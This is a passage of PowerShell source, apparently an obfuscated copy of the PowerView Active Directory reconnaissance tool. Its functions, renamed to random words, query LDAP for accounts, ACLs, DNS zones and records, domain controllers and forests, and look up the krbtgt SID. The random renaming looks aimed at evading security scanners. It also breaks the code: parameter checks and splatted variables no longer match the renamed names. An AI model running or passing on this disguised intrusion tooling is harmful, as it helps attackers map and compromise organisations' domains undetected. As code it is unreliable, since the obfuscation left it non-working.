            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $yqsVbWpr99[$_] = $SdzJuWMG99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $yqsVbWpr99[$_] = $SdzJuWMG99[$_][0] -as $RAkiSvHr99
            }
            elseif ($_ -eq 'samaccounttype') {
                $yqsVbWpr99[$_] = $SdzJuWMG99[$_][0] -as $FRRsEGRX99
            }
            elseif ($_ -eq 'objectguid') {
                $yqsVbWpr99[$_] = (New-Object Guid (,$SdzJuWMG99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $yqsVbWpr99[$_] = $SdzJuWMG99[$_][0] -as $oqUiXgaF99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $nNoTTUwp99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $SdzJuWMG99[$_][0], 0
                if ($nNoTTUwp99.Owner) {
                    $yqsVbWpr99['Owner'] = $nNoTTUwp99.Owner
                }
                if ($nNoTTUwp99.Group) {
                    $yqsVbWpr99['Group'] = $nNoTTUwp99.Group
                }
                if ($nNoTTUwp99.DiscretionaryAcl) {
                    $yqsVbWpr99['DiscretionaryAcl'] = $nNoTTUwp99.DiscretionaryAcl
                }
                if ($nNoTTUwp99.SystemAcl) {
                    $yqsVbWpr99['SystemAcl'] = $nNoTTUwp99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($SdzJuWMG99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $yqsVbWpr99[$_] = "NEVER"
                }
                else {
                    $yqsVbWpr99[$_] = [datetime]::fromfiletime($SdzJuWMG99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($SdzJuWMG99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $SdzJuWMG99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $yqsVbWpr99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $yqsVbWpr99[$_] = ([datetime]::FromFileTime(($SdzJuWMG99[$_][0])))
                }
            }
            elseif ($SdzJuWMG99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $SdzJuWMG99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $yqsVbWpr99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Buddy] error: $_"
                    $yqsVbWpr99[$_] = $Prop[$_]
                }
            }
            elseif ($SdzJuWMG99[$_].count -eq 1) {
                $yqsVbWpr99[$_] = $SdzJuWMG99[$_][0]
            }
            else {
                $yqsVbWpr99[$_] = $SdzJuWMG99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $yqsVbWpr99
    }
    catch {
        Write-Warning "[Buddy] Error parsing LDAP properties : $_"
    }
}
function watersides {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [String]
        $hhaBpean99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $IayDthuO99 = $SSNUOPgW99
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $ojqqfkye99 = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $ojqqfkye99) {
                    $BUBTRBRP99 = "$($ENV:LOGONSERVER -replace '\\','').$ojqqfkye99"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            $cCtVoyrZ99 = debater -Credential $gxazvivN99
            $BUBTRBRP99 = ($cCtVoyrZ99.PdcRoleOwner).Name
            $IayDthuO99 = $cCtVoyrZ99.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $IayDthuO99 = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $IayDthuO99) {
                $BUBTRBRP99 = "$($ENV:LOGONSERVER -replace '\\','').$IayDthuO99"
            }
        }
        else {
            write-verbose "get-domain"
            $cCtVoyrZ99 = debater
            $BUBTRBRP99 = ($cCtVoyrZ99.PdcRoleOwner).Name
            $IayDthuO99 = $cCtVoyrZ99.Name
        }
        if ($PSBoundParameters['Server']) {
            $BUBTRBRP99 = $mSxqoOjK99
        }
        $nszdDKdM99 = 'LDAP://'
        if ($BUBTRBRP99 -and ($BUBTRBRP99.Trim() -ne '')) {
            $nszdDKdM99 += $BUBTRBRP99
            if ($IayDthuO99) {
                $nszdDKdM99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $nszdDKdM99 += $hhaBpean99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($FNgTGwmR99 -Match '^GC://') {
                $DN = $FNgTGwmR99.ToUpper().Trim('/')
                $nszdDKdM99 = ''
            }
            else {
                if ($FNgTGwmR99 -match '^LDAP://') {
                    if ($FNgTGwmR99 -match "LDAP://.+/.+") {
                        $nszdDKdM99 = ''
                        $DN = $FNgTGwmR99
                    }
                    else {
                        $DN = $FNgTGwmR99.SubString(7)
                    }
                }
                else {
                    $DN = $FNgTGwmR99
                }
            }
        }
        else {
            if ($IayDthuO99 -and ($IayDthuO99.Trim() -ne '')) {
                $DN = "DC=$($IayDthuO99.Replace('.', ',DC='))"
            }
        }
        $nszdDKdM99 += $DN
        Write-Verbose "[watersides] search base: $nszdDKdM99"
        if ($gxazvivN99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[watersides] Using alternate credentials for LDAP connection"
            $cCtVoyrZ99 = New-Object DirectoryServices.DirectoryEntry($nszdDKdM99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
            $TbkLYEaJ99 = New-Object System.DirectoryServices.DirectorySearcher($cCtVoyrZ99)
        }
        else {
            $TbkLYEaJ99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$nszdDKdM99)
        }
        $TbkLYEaJ99.PageSize = $mhcqrrQn99
        $TbkLYEaJ99.SearchScope = $vaSWXjPs99
        $TbkLYEaJ99.CacheResults = $False
        $TbkLYEaJ99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $TbkLYEaJ99.ServerTimeLimit = $mvTbAWDU99
        }
        if ($PSBoundParameters['Tombstone']) {
            $TbkLYEaJ99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $TbkLYEaJ99.filter = $HOOTOEqu99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $TbkLYEaJ99.SecurityMasks = Switch ($tmZARvdq99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $SELixTuO99 = $SdzJuWMG99| ForEach-Object { $_.Split(',') }
            $Null = $TbkLYEaJ99.PropertiesToLoad.AddRange(($SELixTuO99))
        }
        $TbkLYEaJ99
    }
}
function Guinea {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $yFzHdYsE99
    )
    BEGIN {
        function navigational {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]$DAFAeeQd99 = $Raw[0]
            [Int]$NwwNwAKC99 = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''
            while ($NwwNwAKC99-- -gt 0)
            {
                [Int]$dPNpuSGi99 = $Raw[$Index++]
                while ($dPNpuSGi99-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        $yIYrDlhm99 = [BitConverter]::ToUInt16($yFzHdYsE99, 2)
        $GzTCOhMX99 = [BitConverter]::ToUInt32($yFzHdYsE99, 8)
        $KcJdjLrU99 = $yFzHdYsE99[12..15]
        $Null = [array]::Reverse($KcJdjLrU99)
        $TTL = [BitConverter]::ToUInt32($KcJdjLrU99, 0)
        $Age = [BitConverter]::ToUInt32($yFzHdYsE99, 20)
        if ($Age -ne 0) {
            $Tpwrotbk99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $Tpwrotbk99 = '[static]'
        }
        $QLnOLeAL99 = New-Object PSObject
        if ($yIYrDlhm99 -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $yFzHdYsE99[24], $yFzHdYsE99[25], $yFzHdYsE99[26], $yFzHdYsE99[27]
            $Data = $IP
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'A'
        }
        elseif ($yIYrDlhm99 -eq 2) {
            $fXMNCMxJ99 = navigational $yFzHdYsE99[24..$yFzHdYsE99.length]
            $Data = $fXMNCMxJ99
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'NS'
        }
        elseif ($yIYrDlhm99 -eq 5) {
            $Alias = navigational $yFzHdYsE99[24..$yFzHdYsE99.length]
            $Data = $Alias
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }
        elseif ($yIYrDlhm99 -eq 6) {
            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'SOA'
        }
        elseif ($yIYrDlhm99 -eq 12) {
            $Ptr = navigational $yFzHdYsE99[24..$yFzHdYsE99.length]
            $Data = $Ptr
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'PTR'
        }
        elseif ($yIYrDlhm99 -eq 13) {
            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }
        elseif ($yIYrDlhm99 -eq 15) {
            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'MX'
        }
        elseif ($yIYrDlhm99 -eq 16) {
            [string]$TXT  = ''
            [int]$dPNpuSGi99 = $yFzHdYsE99[24]
            $Index = 25
            while ($dPNpuSGi99-- -gt 0) {
                $TXT += [char]$yFzHdYsE99[$index++]
            }
            $Data = $TXT
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'TXT'
        }
        elseif ($yIYrDlhm99 -eq 28) {
            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }
        elseif ($yIYrDlhm99 -eq 33) {
            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'SRV'
        }
        else {
            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }
        $QLnOLeAL99 | Add-Member Noteproperty 'UpdatedAtSerial' $GzTCOhMX99
        $QLnOLeAL99 | Add-Member Noteproperty 'TTL' $TTL
        $QLnOLeAL99 | Add-Member Noteproperty 'Age' $Age
        $QLnOLeAL99 | Add-Member Noteproperty 'TimeStamp' $Tpwrotbk99
        $QLnOLeAL99 | Add-Member Noteproperty 'Data' $Data
        $QLnOLeAL99
    }
}
function dunces {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $PPosolen99 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $HFtHDwCo99 = watersides @SearcherArguments
        if ($HFtHDwCo99) {
            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $HFtHDwCo99.FindOne()  }
            else { $pfqXXMQd99 = $HFtHDwCo99.FindAll() }
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                $Out = Buddy -Properties $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[wheezes] Error disposing of the Results object: $_"
                }
            }
            $HFtHDwCo99.dispose()
        }
        $PPosolen99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $zAtSHbmC99 = watersides @SearcherArguments
        if ($zAtSHbmC99) {
            try {
                if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $zAtSHbmC99.FindOne() }
                else { $pfqXXMQd99 = $zAtSHbmC99.FindAll() }
                $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                    $Out = Buddy -Properties $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($pfqXXMQd99) {
                    try { $pfqXXMQd99.dispose() }
                    catch {
                        Write-Verbose "[dunces] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[dunces] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $zAtSHbmC99.dispose()
        }
    }
}
function misinterpret {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $lZtKKPNg99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $PPosolen99 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($lZtKKPNg99),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $TlmRHcNz99 = watersides @SearcherArguments
        if ($TlmRHcNz99) {
            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $TlmRHcNz99.FindOne() }
            else { $pfqXXMQd99 = $TlmRHcNz99.FindAll() }
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Buddy -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $lZtKKPNg99
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $ZSBUvEpO99 = Guinea -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $ZSBUvEpO99 = Guinea -DNSRecord $Out.dnsrecord
                    }
                    if ($ZSBUvEpO99) {
                        $ZSBUvEpO99.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[misinterpret] Error: $_"
                    $Out
                }
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[misinterpret] Error disposing of the Results object: $_"
                }
            }
            $TlmRHcNz99.dispose()
        }
    }
}
function debater {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[debater] Using alternate credentials for debater'
            if ($PSBoundParameters['Domain']) {
                $IayDthuO99 = $SSNUOPgW99
            }
            else {
                $IayDthuO99 = $gxazvivN99.GetNetworkCredential().Domain
                Write-Verbose "[debater] Extracted domain '$IayDthuO99' from -Credential"
            }
            $KFJNQbJm99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $IayDthuO99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($KFJNQbJm99)
            }
            catch {
                Write-Verbose "[debater] The specified domain '$IayDthuO99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $KFJNQbJm99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $SSNUOPgW99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($KFJNQbJm99)
            }
            catch {
                Write-Verbose "[debater] The specified domain '$SSNUOPgW99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[debater] Error retrieving the current domain: $_"
            }
        }
    }
}
function deplorably {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $vScLHGBn99 = @{}
        if ($PSBoundParameters['Domain']) { $vScLHGBn99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Credential']) { $vScLHGBn99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $vScLHGBn99['Server'] = $mSxqoOjK99 }
            $vScLHGBn99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
            doubtlessly @Arguments
        }
        else {
            $jAPRADZj99 = debater @Arguments
            if ($jAPRADZj99) {
                $jAPRADZj99.DomainControllers
            }
        }
    }
}
function ampere {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZKthMMjt99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose "[ampere] Using alternate credentials for ampere"
            if ($PSBoundParameters['Forest']) {
                $uPNxUikB99 = $ZKthMMjt99
            }
            else {
                $uPNxUikB99 = $gxazvivN99.GetNetworkCredential().Domain
                Write-Verbose "[ampere] Extracted domain '$ZKthMMjt99' from -Credential"
            }
            $UFjiuYZK99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $uPNxUikB99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
            try {
                $fNjNPsbS99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($UFjiuYZK99)
            }
            catch {
                Write-Verbose "[ampere] The specified forest '$uPNxUikB99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $UFjiuYZK99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $ZKthMMjt99)
            try {
                $fNjNPsbS99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($UFjiuYZK99)
            }
            catch {
                Write-Verbose "[ampere] The specified forest '$ZKthMMjt99' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $fNjNPsbS99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if ($fNjNPsbS99) {
            if ($PSBoundParameters['Credential']) {
                $KNgdfcEE99 = (township -Identity "krbtgt" -Domain $fNjNPsbS99.RootDomain.Name -Credential $gxazvivN99).objectsid
            }
            else {
                $KNgdfcEE99 = (township -Identity "krbtgt" -Domain $fNjNPsbS99.RootDomain.Name).objectsid
            }
            $Parts = $KNgdfcEE99 -Split '-'
            $KNgdfcEE99 = $Parts[0..$($Parts.length-2)] -join '-'
            $fNjNPsbS99 | Add-Member NoteProperty 'RootDomainSid' $KNgdfcEE99
            $fNjNPsbS99
        }
    }
}
function employing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZKthMMjt99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $vScLHGBn99 = @{}
        if ($PSBoundParameters['Forest']) { $vScLHGBn99['Forest'] = $ZKthMMjt99 }
        if ($PSBoundParameters['Credential']) { $vScLHGBn99['Credential'] = $gxazvivN99 }
        $fNjNPsbS99 = ampere @Arguments
        if ($fNjNPsbS99) {
            $fNjNPsbS99.Domains
        }
    }
}
function spontaneous {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZKthMMjt99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $vScLHGBn99 = @{}
        if ($PSBoundParameters['Forest']) { $vScLHGBn99['Forest'] = $ZKthMMjt99 }
        if ($PSBoundParameters['Credential']) { $vScLHGBn99['Credential'] = $gxazvivN99 }
        $fNjNPsbS99 = ampere @Arguments
        if ($fNjNPsbS99) {
            $fNjNPsbS99.FindAllGlobalCatalogs()
        }
    }
}
function kimonos {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $xwoRVUyD99,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZKthMMjt99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $vScLHGBn99 = @{}
        if ($PSBoundParameters['Forest']) { $vScLHGBn99['Forest'] = $ZKthMMjt99 }
        if ($PSBoundParameters['Credential']) { $vScLHGBn99['Credential'] = $gxazvivN99 }
        $fNjNPsbS99 = ampere @Arguments
        if ($fNjNPsbS99) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($ZugBVagP99 in $xwoRVUyD99) {
                    $fNjNPsbS99.Schema.FindClass($ZugBVagP99)
                }
            }
            else {
                $fNjNPsbS99.Schema.FindAllClasses()
            }
        }
    }
}
function framer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $xwoRVUyD99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $CcOGhxIw99,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $GmmvNchI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
